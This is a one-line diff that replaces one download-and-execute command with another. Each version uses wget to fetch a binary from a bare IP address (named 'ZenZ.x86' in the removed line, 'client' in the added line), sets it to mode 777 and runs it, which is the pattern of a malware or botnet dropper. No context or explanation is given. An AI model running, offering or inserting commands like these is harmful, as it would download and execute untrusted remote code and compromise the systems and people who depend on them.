@@ -1,1 +1,1 @@
-wget http://171.22.30.134/ZenZ.x86; chmod 777 ZenZ.x86; ./ZenZ.x86
+wget http://45.95.55.191/client; chmod 777 client; ./client
